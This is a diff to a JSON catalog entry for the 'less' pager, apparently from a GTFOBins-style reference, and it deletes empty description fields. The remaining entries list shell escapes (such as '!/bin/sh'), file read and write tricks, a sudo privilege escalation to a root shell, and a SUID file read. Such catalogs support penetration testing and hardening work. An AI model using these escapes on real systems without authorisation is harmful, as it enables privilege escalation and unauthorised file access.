@@ -2,21 +2,21 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "less /etc/profile\n!/bin/sh\n"
       },
       {
-        "description": "",
+        
         "code": "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n"
       },
       {
-        "description": "",
+        
         "code": "less /etc/profile\nv:shell\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "less file_to_read\n"
       },
       {
@@ -26,7 +26,7 @@
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "echo DATA | less\nsfile_to_write\nq\n"
       },
       {
@@ -36,13 +36,13 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo less /etc/profile\n!/bin/sh\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./less file_to_read\n"
       }
     ]
